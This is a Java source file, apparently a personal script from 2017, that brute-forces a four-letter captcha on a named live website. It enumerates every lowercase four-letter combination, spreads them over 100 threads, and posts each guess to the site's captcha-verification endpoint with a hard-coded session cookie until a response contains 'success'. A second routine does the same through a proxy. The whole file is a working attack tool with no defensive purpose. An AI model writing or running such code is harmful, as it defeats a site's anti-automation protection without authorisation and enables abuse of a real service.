package validate;

import org.apache.commons.httpclient.Header;
import org.apache.commons.httpclient.HostConfiguration;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.methods.PostMethod;

import java.io.IOException;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.Stack;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by zhengjiarong on 2017/7/15.
 */
public class HttpAsk {
    public static  void main(String[] args){
        multiPostForm();
    }
    public static void multiPostForm(){
         Boolean flag=false;
        Integer threadNum=100;
        ExecutorService executorService= Executors.newFixedThreadPool(threadNum);
//        Stack<String> stack=getPsdStack();
        List<String> arrayList=getArrayList();
        Integer split=arrayList.size()/threadNum;
        Integer start=0;
        List<List<String>> splitList=new ArrayList<List<String>>();
        for(int i=0;i<threadNum;i++){
            splitList.add(arrayList.subList(start,start+split));
            start=start+split;
        }
        p("初始化密码成功");
//        p(stack.size()+"");
        for(int i=0;i<threadNum;i++){
            List<String> ls=splitList.get(i);
            executorService.submit(new PostThread("Thread:"+i,ls.toArray(new String[ls.size()])));
        }
    }
    public static List<String> getArrayList(){
        List<String> al=new LinkedList<String>();
        String element="abcdefghijklmnopqrstuvwxyz";
//        Integer allLen=element.length()*element.length()*element.length()*element.length();

        String[] elements=element.split("",0);
        for(int i=1;i<elements.length;i++){
            for(int j=1;j<elements.length;j++){
                for(int k=1;k<elements.length;k++){
                    for(int l=1;l<elements.length;l++){
                        al.add(elements[i]+elements[j]+elements[k]+elements[l]);
                    }
                }
            }
        }
        return  al;
    }
    public static void postForm(){


        HttpClient httpClient = new HttpClient();
        HostConfiguration hostConfiguration=new HostConfiguration();
        hostConfiguration.setHost("192.168.171.87");
        hostConfiguration.setProxy("192.168.171.89",8888);
        httpClient.setHostConfiguration(hostConfiguration);
        try {
            PostMethod postMethod=null;
            String element="abcdefghijklmnopqrstuvwxyz";
            String[] elements=element.split("",0);
            int count =0;
            for(int i=1;i<elements.length;i++){
                for(int j=1;j<elements.length;j++){
                    for(int k=1;k<elements.length;k++){
                        for(int l=1;l<elements.length;l++){
                            String pssword=elements[i]+elements[j]+elements[k]+elements[l];
                            postMethod=getPostMethod(pssword);
                            httpClient.executeMethod(postMethod);
                            String body=postMethod.getResponseBodyAsString();
                            System.out.println(count+":"+pssword);
                            if(body.contains("success"))break;
                            count++;
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void p(String s){
        System.out.println(s);
    }
    public static Stack<String> getPsdStack(){
        Stack<String> stack=new Stack<String>();
        String element="abcdefghijklmnopqrstuvwxyz";
        String[] elements=element.split("",0);
        for(int i=1;i<elements.length;i++){
            for(int j=1;j<elements.length;j++){
                for(int k=1;k<elements.length;k++){
                    for(int l=1;l<elements.length;l++){
                        stack.push(elements[i]+elements[j]+elements[k]+elements[l]);
                    }
                }
            }
        }
        return stack;
    }
    public static PostMethod getPostMethod(String pa){
        String url="http://mmdasai.cnweike.cn/index.php?r=matchV3/user/ajaxVerifyCaptcha";
        PostMethod postMethod=new PostMethod(url);
        postMethod.addParameter("captcha",pa);
        postMethod.setRequestHeader("X-Requested-With","XMLHttpRequest");
        postMethod.setRequestHeader("Cookie","PHPSESSID=pdkbqr6uur9p970sgm1mnv43i3; Hm_lvt_a52e134d83e9d7feb542179119d6fe16=1500085471; Hm_lpvt_a52e134d83e9d7feb542179119d6fe16=1500090155");
        return postMethod;
    }
    public static List<Header> getHeadersByArray(String[][] arrays){
        List<Header> headerList=new ArrayList<Header>();
        for(String[] as:arrays){
            headerList.add(new Header(as[0],as[1]));
        }
        return headerList;
    }
    public static PostMethod addHeaders(PostMethod postMethod,List<Header> headerList){
        for(Header h:headerList){
            postMethod.setRequestHeader(h);
        }
        return  postMethod;
    }
}
